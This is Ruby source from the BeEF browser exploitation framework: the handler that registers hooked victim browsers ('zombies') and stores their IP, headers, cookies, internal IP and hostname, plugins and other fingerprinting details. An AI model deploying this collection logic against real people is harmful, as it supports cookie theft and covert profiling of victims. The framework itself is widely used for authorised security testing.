#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Extension
module Initialization
  
  #
  # The http handler that manages the return of the initial browser details.
  #
  class Handler 
    
    attr_reader :guard
    @data = {}

    HB = BeEF::Core::Models::HookedBrowser
    BD = BeEF::Extension::Initialization::Models::BrowserDetails
    
    def initialize(data)
      @guard = Mutex.new
      @data = data
      setup()
    end

    def setup()
      # validate hook session value
      session_id = get_param(@data, 'beefhook')
      raise WEBrick::HTTPStatus::BadRequest, "session id is invalid" if not BeEF::Filters.is_valid_hook_session_id?(session_id)
      hooked_browser = HB.first(:session => session_id)
      return if not hooked_browser.nil? # browser is already registered with framework

      # create the structure representing the hooked browser
      zombie = BeEF::Core::Models::HookedBrowser.new(:ip => @data['request'].peeraddr[3], :session => session_id)
      zombie.firstseen = Time.new.to_i

      # set the zombie hooked domain. Uses the origin header, or the host header if the origin is not present (same-domain)
      if @data['request'].header['origin'].nil? or @data['request'].header['origin'].empty?
        log_zombie_domain = @data['request'].header['host'].first
      else
        log_zombie_domain =  @data['request'].header['origin'].first
      end
      log_zombie_domain.gsub!('http://', '')
      log_zombie_domain.gsub!('https://', '')
      zombie.domain = log_zombie_domain
      zombie.httpheaders = @data['request'].header.to_json

      zombie.save # the save needs to be conducted before any hooked browser specific logging
      
      # add a log entry for the newly hooked browser
      BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}", "#{zombie.id}") 

      # get and store browser name
      begin
        browser_name = get_param(@data['results'], 'BrowserName')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser name" if not BeEF::Filters.is_valid_browsername?(browser_name)
        BD.set(session_id, 'BrowserName', browser_name)
      rescue
        print_error "Invalid browser name returned from the hook browser's initial connection."
      end
      
      # get and store browser version
      begin
        browser_version = get_param(@data['results'], 'BrowserVersion')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser version" if not BeEF::Filters.is_valid_browserversion?(browser_version)
        BD.set(session_id, 'BrowserVersion', browser_version)
      rescue
        print_error "Invalid browser version returned from the hook browser's initial connection."
      end

      # get and store browser string
      begin
        browser_string = get_param(@data['results'], 'BrowserReportedName')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser string" if not BeEF::Filters.is_valid_browserstring?(browser_string)
        BD.set(session_id, 'BrowserReportedName', browser_string)
      rescue
        print_error "Invalid browser string returned from the hook browser's initial connection."
      end

      # get and store the cookies
      begin
        cookies = get_param(@data['results'], 'Cookies')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid cookies" if not BeEF::Filters.is_valid_cookies?(cookies)
        BD.set(session_id, 'Cookies', cookies)
      rescue
        print_error "Invalid cookies returned from the hook browser's initial connection."
      end

      # get and store the os name
      begin
        os_name = get_param(@data['results'], 'OsName')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser os name" if not BeEF::Filters.is_valid_osname?(os_name)
        BD.set(session_id, 'OsName', os_name)
      rescue
        print_error "Invalid operating system name returned from the hook browser's initial connection."
      end

      # get and store page title
      begin
        page_title = get_param(@data['results'], 'PageTitle')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid page title" if not BeEF::Filters.is_valid_pagetitle?(page_title)
        BD.set(session_id, 'PageTitle', page_title)
      rescue
        print_error "Invalid page title returned from the hook browser's initial connection."
      end

      # get and store page title
      begin
        host_name = get_param(@data['results'], 'HostName')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid host name" if not BeEF::Filters.is_valid_hostname?(host_name)
        BD.set(session_id, 'HostName', host_name)
      rescue
        print_error "Invalid host name returned from the hook browser's initial connection."
      end

      # get and store the browser plugins
      begin
        browser_plugins = get_param(@data['results'], 'BrowserPlugins')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser plugins" if not BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
        BD.set(session_id, 'BrowserPlugins', browser_plugins)
      rescue
        print_error "Invalid browser plugins returned from the hook browser's initial connection."
      end

      # get and store the internal ip address
      begin
        internal_ip = get_param(@data['results'], 'InternalIP')
        if not internal_ip.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid internal IP address" if not BeEF::Filters.is_valid_ip?(internal_ip)
          BD.set(session_id, 'InternalIP', internal_ip)
        end
      rescue
        print_error "Invalid internal IP address returned from the hook browser's initial connection."
      end

      # get and store the internal hostname
      begin
        internal_hostname = get_param(@data['results'], 'InternalHostname')
        if not internal_hostname.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid internal host name" if not BeEF::Filters.is_valid_hostname?(host_name)
          BD.set(session_id, 'InternalHostname', internal_hostname)
        end
      rescue
        print_error "Invalid internal hostname returned from the hook browser's initial connection."
      end

      # get and store the hooked browser type
      begin
        browser_type = get_param(@data['results'], 'BrowserType')
        if not browser_type.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid browser type" if not BeEF::Filters.is_valid_browsertype?(browser_type)
          BD.set(session_id, 'BrowserType', browser_type)
        end
      rescue
        print_error "Invalid hooked browser type returned from the hook browser's initial connection."
      end

      # get and store the zombie screen size and color depth
      begin
        screen_params = get_param(@data['results'], 'ScreenParams')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid screen params" if not BeEF::Filters.is_valid_screen_params?(screen_params)
        BD.set(session_id, 'ScreenParams', screen_params)
      rescue
        print_error "Invalid screen params returned from the hook browser's initial connection."
      end

      # get and store the window size
      begin
        window_size = get_param(@data['results'], 'WindowSize')
        raise WEBrick::HTTPStatus::BadRequest, "Invalid window size" if not BeEF::Filters.is_valid_window_size?(window_size)
        BD.set(session_id, 'WindowSize', window_size)
      rescue
        print_error "Invalid window size returned from the hook browser's initial connection."
      end

      # get and store the yes|no value for JavaEnabled
      begin
        java_enabled = get_param(@data['results'], 'JavaEnabled')
        if not java_enabled.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for JavaEnabled" if not BeEF::Filters.is_valid_yes_no?(java_enabled)
          BD.set(session_id, 'JavaEnabled', java_enabled)
        end
      rescue
        print_error "Invalid value for JavaEnabled returned from the hook browser's initial connection."
      end

      # get and store the yes|no value for VBScriptEnabled
      begin
        vbscript_enabled = get_param(@data['results'], 'VBScriptEnabled')
        if not vbscript_enabled.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for VBScriptEnabled" if not BeEF::Filters.is_valid_yes_no?(vbscript_enabled)
          BD.set(session_id, 'VBScriptEnabled', vbscript_enabled)
        end
      rescue
        print_error "Invalid value for VBScriptEnabled returned from the hook browser's initial connection."
      end
    
      # get and store the yes|no value for HasFlash
      begin
        has_flash = get_param(@data['results'], 'HasFlash')
        if not has_flash.nil? 
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for HasFlash" if not BeEF::Filters.is_valid_yes_no?(has_flash)
          BD.set(session_id, 'HasFlash', has_flash)
        end
      rescue
        print_error "Invalid value for HasFlash returned from the hook browser's initial connection."
      end

      # get and store the yes|no value for HasGoogleGears
      begin
        has_googlegears = get_param(@data['results'], 'HasGoogleGears')
        if not has_googlegears.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for HasGoogleGears" if not BeEF::Filters.is_valid_yes_no?(has_googlegears)
          BD.set(session_id, 'HasGoogleGears', has_googlegears)
        end
      rescue
        print_error "Invalid value for HasGoogleGears returned from the hook browser's initial connection."
      end

      # get and store whether the browser has session cookies enabled
      begin
        has_session_cookies = get_param(@data['results'], 'hasSessionCookies')
        if not has_session_cookies.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for hasSessionCookies" if not BeEF::Filters.is_valid_yes_no?(has_session_cookies)
          BD.set(session_id, 'hasSessionCookies', has_session_cookies)
        end
      rescue
        print_error "Invalid value for hasSessionCookies returned from the hook browser's initial connection."
      end
    
      # get and store whether the browser has persistent cookies enabled
      begin
        has_persistent_cookies = get_param(@data['results'], 'hasPersistentCookies')
        if not has_persistent_cookies.nil?
          raise WEBrick::HTTPStatus::BadRequest, "Invalid value for hasPersistentCookies" if not BeEF::Filters.is_valid_yes_no?(has_persistent_cookies)
          BD.set(session_id, 'hasPersistentCookies', has_persistent_cookies)
        end
      rescue
        print_error "Invalid value for hasPersistentCookies returned from the hook browser's initial connection."
      end

    end
   
    def get_param(query, key)
      return (query.class == Hash and query.has_key?(key)) ? query[key] : nil
    end
    
  end
  
end
end
end
